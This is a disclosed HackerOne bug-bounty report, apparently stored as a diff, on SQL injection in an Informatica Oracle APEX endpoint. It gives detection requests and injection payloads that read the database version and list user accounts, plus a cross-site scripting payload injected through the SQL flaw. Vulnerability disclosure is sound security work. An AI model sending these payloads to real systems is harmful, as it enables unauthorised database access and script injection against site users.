@@ -1,0 +1,34 @@
+ReportLink:https://hackerone.com/reports/178057
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/e3xpl0it
+ReportedTo:Informatica(informatica)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:21.01.2017 19:05:21
+
+Summary:
+
+Hi host ipm.informatica.com is vulnerable to sql injection attacks the web application does not produce sufficient validation on user input.
+
+POC
+detection
+request 1
+http://ipm.informatica.com/pls/apex/f?1'=1  response 500 HTTP/1.1 500 Internal Server Error
+request 2
+http://ipm.informatica.com/pls/apex/f?1''=1 response HTTP/1.1 404 Not Found
+
+
+exploitation
+
+http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+banner+FROM+v$version   
+  
+Oracle Database 11g Release 11.2.0.3.0 - 64bit Production PL/SQL Release 11.2.0.3.0 - Production CORE 11.2.0.3.0 
+Production TNS for Linux: Version 11.2.0.3.0 - Production NLSRTL Version 11.2.0.3.0 - Production 
+
+Cross Site Scripting via sql injection 
+
+http://ipm.informatica.com/pls/apex/f?);HTP.PRINT(:1);--=positive<svg/onload=prompt('XSS\u0020via\u0020sql\u0020injection')>
+
+and etc 
+http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS
